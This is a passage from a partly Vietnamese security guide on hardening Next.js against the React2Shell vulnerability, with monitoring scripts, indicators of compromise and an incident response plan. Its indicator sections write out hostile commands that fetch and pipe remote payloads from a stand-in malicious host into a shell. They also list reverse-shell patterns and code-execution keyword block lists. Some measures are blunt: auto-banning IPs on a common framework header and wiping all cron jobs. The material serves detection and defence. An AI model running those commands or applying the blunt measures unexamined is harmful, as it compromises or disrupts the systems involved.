  // Check for other suspicious patterns
  if (req.body && typeof req.body === 'string') {
    if (req.body.includes('vm.runInThisContext') || 
        req.body.includes('child_process') ||
        req.body.includes('fs.writeFile')) {
      
      securityLogger.error({
        type: 'MALICIOUS_PAYLOAD_DETECTED',
        timestamp: new Date().toISOString(),
        ip: req.ip,
        payload: req.body.substring(0, 500),
        severity: 'CRITICAL'
      });
      
      return res.status(403).json({ error: 'Forbidden' });
    }
  }
  
  next();
}

module.exports = logSecurityEvent;
```

### 7.2. Real-time Monitoring Script

```bash
#!/bin/bash
# /usr/local/bin/cve-2025-55182-monitor.sh

LOG_FILE="/var/log/nginx/access.log"
ALERT_EMAIL="admin@yourdomain.com"
ALERT_THRESHOLD=5

# Monitor cho exploitation attempts
tail -F "$LOG_FILE" | while read line; do
    # Check for CVE-2025-55182 indicators
    if echo "$line" | grep -qi "next-action\|rsc-action-id"; then
        IP=$(echo "$line" | awk '{print $1}')
        TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
        
        echo "[$TIMESTAMP] ALERT: CVE-2025-55182 exploitation attempt from $IP" | \
            tee -a /var/log/security-alerts.log
        
        # Ban IP automatically
        sudo ufw deny from "$IP"
        
        # Send alert
        echo "CVE-2025-55182 exploitation attempt detected from $IP at $TIMESTAMP" | \
            mail -s "CRITICAL: React2Shell Attack Attempt" "$ALERT_EMAIL"
    fi
    
    # Check for crypto miner indicators
    if echo "$line" | grep -qi "xmrig\|miner\|stratum"; then
        echo "[$TIMESTAMP] ALERT: Crypto miner activity detected" | \
            tee -a /var/log/security-alerts.log
    fi
done
```

```bash
# Make executable v√† run as service
chmod +x /usr/local/bin/cve-2025-55182-monitor.sh

# Create systemd service
sudo vim /etc/systemd/system/cve-monitor.service
```

```ini
[Unit]
Description=CVE-2025-55182 Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/cve-2025-55182-monitor.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable cve-monitor
sudo systemctl start cve-monitor
```

### 7.3. Automated Scanning

```bash
#!/bin/bash
# daily-security-scan.sh

echo "=== Security Scan $(date) ===" >> /var/log/daily-scan.log

# 1. Check for suspicious processes
ps aux | grep -E "xmrig|miner|crypto|wget.*http|curl.*http" | grep -v grep >> /var/log/daily-scan.log

# 2. Check for suspicious network connections
netstat -antp | grep ESTABLISHED | grep -v "127.0.0.1\|localhost" >> /var/log/daily-scan.log

# 3. Check recent file modifications
find /root -type f -mtime -1 -ls >> /var/log/daily-scan.log
find /tmp -type f -mtime -1 -ls >> /var/log/daily-scan.log

# 4. Check cron jobs
crontab -l >> /var/log/daily-scan.log

# 5. Check for new users
cat /etc/passwd | tail -10 >> /var/log/daily-scan.log

# 6. Disk usage check (crypto miners often fill disk)
df -h >> /var/log/daily-scan.log

# 7. Check CPU usage (crypto miners use high CPU)
top -bn1 | head -20 >> /var/log/daily-scan.log

echo "=== Scan Complete ===" >> /var/log/daily-scan.log
```

```bash
# Add to crontab
crontab -e
# Add:
0 2 * * * /usr/local/bin/daily-security-scan.sh
```

---

## 8. Indicators of Compromise

### 8.1. Network Indicators

**HTTP Headers trong Attack Traffic:**
```
Next-Action: x
X-Nextjs-Request-Id: <random-id>
Next-Router-State-Tree: ["",{"children":["__PAGE__",{},null,null]},null,null,true]
Content-Type: multipart/form-data
```

**Malicious User-Agents:**
```
Go-http-client/*
curl/*
python-requests/*
Scanner-*
Assetnote/*
```

**Known Malicious IPs (c·∫≠p nh·∫≠t li√™n t·ª•c):**
```
183.6.80.214
45.*.*.* (nhi·ªÅu ranges t·ª´ China)
Xem th√™m t·∫°i: https://github.com/DataDog/indicators-of-compromise/tree/main/react-CVE-2025-55182
```

### 8.2. File System Indicators

**Malicious Scripts:**
```bash
/tmp/sex.sh               # Known malware filename
/tmp/slt                  # Shell script dropper
/tmp/.X*                  # Hidden files
/var/tmp/*miner*          # Miner executables
~/.ssh/authorized_keys    # Check for new SSH keys
```

**Modified System Files:**
```bash
/boot/grub/grub.cfg       # GRUB modifications
/etc/crontab              # New cron jobs
/etc/rc.local             # Startup scripts
~/.bashrc, ~/.bash_profile # Profile modifications
```

### 8.3. Process Indicators

**Suspicious Processes:**
```bash
# Crypto miners
xmrig, xmr-stak, cpuminer, minergate

# Backdoors
bash -i, nc -e, python -c, perl -e

# Reverse shells
/bin/bash -i, sh -i

# Network downloaders
wget http://, curl http://, python -m http.server
```

### 8.4. Network Indicators

**Suspicious Connections:**
```bash
# Crypto mining pools
stratum+tcp://
pool.*.com:*
*.pool.com

# Known C2 servers
Cobalt Strike beacons
Sliver C2 traffic

# Cloud metadata access
169.254.169.254/latest/meta-data/
```

### 8.5. Log Patterns

**Nginx Access Log:**
```
POST / HTTP/1.1" 200 - "Next-Action: x"
POST / HTTP/1.1" 500 - multipart/form-data
```

**System Logs:**
```bash
# Suspicious commands
bash -c "echo <base64> | base64 -d | bash"
curl -s http://malicious.com/payload.sh | bash
wget -qO- http://malicious.com/miner | sh
```

---

## 9. Best Practices

### 9.1. Development Practices

```typescript
// ‚úÖ DO: S·ª≠ d·ª•ng Pages Router cho internal tools
// pages/admin/index.tsx
export default function AdminPage() {
  // Safe - Pages Router kh√¥ng vulnerable
}

// ‚ùå DON'T: S·ª≠ d·ª•ng App Router cho untrusted input
// app/admin/page.tsx - Vulnerable n·∫øu ch∆∞a patch

// ‚úÖ DO: Input validation v√† sanitization
function validateInput(data: any): boolean {
  if (typeof data !== 'object') return false;
  
  // Ki·ªÉm tra cho malicious patterns
  const jsonStr = JSON.stringify(data);
  const dangerousPatterns = [
    'vm.runInThisContext',
    'child_process',
    'eval(',
    'Function(',
    '__proto__',
    'constructor'
  ];
  
  return !dangerousPatterns.some(pattern => 
    jsonStr.includes(pattern)
  );
}

// ‚úÖ DO: Rate limiting cho t·∫•t c·∫£ API endpoints
// middleware.ts
export function middleware(request: NextRequest) {
  const ip = request.ip || 'unknown';
  const rateLimit = rateLimitByIP(ip);
  
  if (!rateLimit.allowed) {
    return new Response('Too Many Requests', { status: 429 });
  }
  
  return NextResponse.next();
}
```

### 9.2. Deployment Checklist

**Pre-Deployment:**
- [ ] C·∫≠p nh·∫≠t Next.js l√™n patched version
- [ ] C·∫≠p nh·∫≠t t·∫•t c·∫£ React dependencies
- [ ] Review t·∫•t c·∫£ Server Components v√† Server Actions
- [ ] Test authentication v√† authorization
- [ ] Ch·∫°y security scan (npm audit, yarn audit)
- [ ] Review environment variables
- [ ] Ki·ªÉm tra CORS configuration
- [ ] Test rate limiting

**Deployment:**
- [ ] Deploy trong isolated environment (Docker/container)
- [ ] C·∫•u h√¨nh WAF rules
- [ ] Enable HTTPS/TLS
- [ ] C·∫•u h√¨nh reverse proxy (Nginx)
- [ ] Setup monitoring v√† logging
- [ ] Configure backup strategy

**Post-Deployment:**
- [ ] Monitor logs trong 24h ƒë·∫ßu
- [ ] Test t·∫•t c·∫£ critical flows
- [ ] Verify WAF rules ƒëang ho·∫°t ƒë·ªông
- [ ] Check kh√¥ng c√≥ suspicious connections
- [ ] Run vulnerability scan
- [ ] Document configuration changes

### 9.3. Security Headers

```typescript
// next.config.js
const securityHeaders = [
  {
    key: 'X-Frame-Options',
    value: 'SAMEORIGIN'
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff'
  },
  {
    key: 'X-XSS-Protection',
    value: '1; mode=block'
  },
  {
    key: 'Referrer-Policy',
    value: 'strict-origin-when-cross-origin'
  },
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=()'
  },
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=31536000; includeSubDomains'
  },
  {
    key: 'Content-Security-Policy',
    value: `
      default-src 'self';
      script-src 'self' 'unsafe-inline' 'unsafe-eval';
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: https:;
      font-src 'self' data:;
      connect-src 'self' https://api.yourdomain.com;
      frame-ancestors 'none';
    `.replace(/\s+/g, ' ').trim()
  }
];

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders,
      },
    ];
  },
};
```

### 9.4. Regular Maintenance

```bash
#!/bin/bash
# weekly-maintenance.sh

echo "=== Weekly Security Maintenance $(date) ==="

# 1. Update all packages
cd /path/to/nextjs-app
npm update
npm audit fix

# 2. Check for new CVEs
npm audit --json > audit-report.json

# 3. Update system packages
apt update && apt upgrade -y

# 4. Rotate logs
logrotate -f /etc/logrotate.conf

# 5. Clean old Docker images
docker system prune -af

# 6. Backup database
pg_dump -U postgres dbname > backup-$(date +%F).sql

# 7. Test backups
# ... your backup testing procedure

# 8. Review security logs
grep -i "error\|attack\|suspicious" /var/log/security-alerts.log

# 9. Generate report
echo "Weekly maintenance completed at $(date)" >> /var/log/maintenance.log
```

### 9.5. Incident Response Plan

**N·∫øu ph√°t hi·ªán ƒë√£ b·ªã hack:**

1. **IMMEDIATE (0-15 minutes):**
   ```bash
   # Isolate server
   sudo ufw deny in from any
   
   # Stop compromised services
   systemctl stop nextjs
   systemctl stop nginx
   
   # Capture memory dump (n·∫øu c√≥ tools)
   sudo dd if=/dev/mem of=/tmp/memory-dump.bin
   
   # Take disk snapshot (cloud)
   # AWS: aws ec2 create-snapshot
   # GCP: gcloud compute snapshots create
   ```

2. **CONTAINMENT (15-60 minutes):**
   ```bash
   # Kill suspicious processes
   pkill -9 xmrig
   pkill -9 -f "suspicious-script"
   
   # Remove malicious files
   rm -f /tmp/sex.sh /tmp/slt
   
   # Remove cron jobs
   crontab -r
   
   # Disable compromised users
   passwd -l compromised_user
   
   # Change all passwords and rotate keys
   # ... rotate database passwords
   # ... rotate API keys
   # ... rotate JWT secrets
   ```

3. **ERADICATION (1-4 hours):**
   ```bash
   # Full system reinstall t·ª´ backup s·∫°ch
   # Ho·∫∑c rebuild t·ª´ ƒë·∫ßu v·ªõi patched versions
   
   # Update t·∫•t c·∫£ packages
   npm install next@latest react@latest
   
   # Restore data t·ª´ backup (verified clean)
   ```

4. **RECOVERY (4-24 hours):**
   ```bash
   # Deploy patched version
   # Enable enhanced monitoring
   # Test t·∫•t c·∫£ functionality
   # Gradual traffic restoration
   ```

5. **POST-INCIDENT (1-7 days):**
   - Root cause analysis
   - Update incident response procedures
   - Security audit to√†n b·ªô h·ªá th·ªëng
   - Implement additional safeguards
   - Staff training

---

## 10. T√†i Nguy√™n Tham Kh·∫£o

### 10.1. Official Advisories

- **Next.js Security Advisory**: https://nextjs.org/blog/CVE-2025-66478
- **React Security Advisory**: https://react.dev/blog/2025/12/03/critical-security-vulnerability-rsc
- **CVE Details**: https://nvd.nist.gov/vuln/detail/CVE-2025-55182
- **React2Shell Website**: https://react2shell.com

### 10.2. Security Research

- **Wiz Research**: https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182
- **Datadog Security Labs**: https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell
- **AWS Security Blog**: https://aws.amazon.com/blogs/security/china-nexus-cyber-threat-groups-rapidly-exploit-react2shell-vulnerability-cve-2025-55182/
- **Unit 42 (Palo Alto)**: https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/

### 10.3. IOCs v√† Detection

- **Datadog IOCs**: https://github.com/DataDog/indicators-of-compromise/tree/main/react-CVE-2025-55182
- **GreyNoise Observation**: https://www.greynoise.io/blog/cve-2025-55182-react2shell
- **CISA KEV Catalog**: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

### 10.4. Tools

- **Fix Tool**: `npx fix-react2shell-next` - https://github.com/vercel/next.js/tree/canary/packages/fix-react2shell-next
- **Version Checker**: https://github.com/lachlan2k/React2Shell-CVE-2025-55182-scanner
- **WAF Rules**: Cloud providers documentation

### 10.5. Best Practices Guides

- **Next.js Security**: https://nextjs.org/docs/pages/building-your-application/routing/authenticating
- **OWASP API Security**: https://owasp.org/www-project-api-security/
- **Node.js Security Best Practices**: https://nodejs.org/en/docs/guides/security/

---

## üìû Support v√† Updates

**C·∫≠p nh·∫≠t th∆∞·ªùng xuy√™n:**
- Theo d√µi official Next.js blog
- Subscribe security mailing lists
- Monitor CVE databases
- Join security communities

**Emergency Contact:**
- CISA: https://www.cisa.gov/report
- Security researchers: security@vercel.com, security@react.dev

---

## ‚ö†Ô∏è L∆ØU √ù QUAN TR·ªåNG

1. **KH√îNG t·ª± t·∫°o "fix" m√† kh√¥ng test k·ªπ**
2. **LU√îN backup tr∆∞·ªõc khi thay ƒë·ªïi**
3. **Test trong staging environment tr∆∞·ªõc**
4. **Monitor logs sau m·ªçi changes**
5. **Document t·∫•t c·∫£ changes**
6. **C√≥ incident response plan**
7. **Regular security audits**
8. **Keep dependencies updated**

---

**Document Version:** 1.0  
**Last Updated:** December 9, 2025  
**Author:** Claude (Anthropic)  
**For:** NextJS Security Hardening  

**Status:** ‚úÖ Production Ready  
**Priority:** üî¥ CRITICAL - Implement ASAP
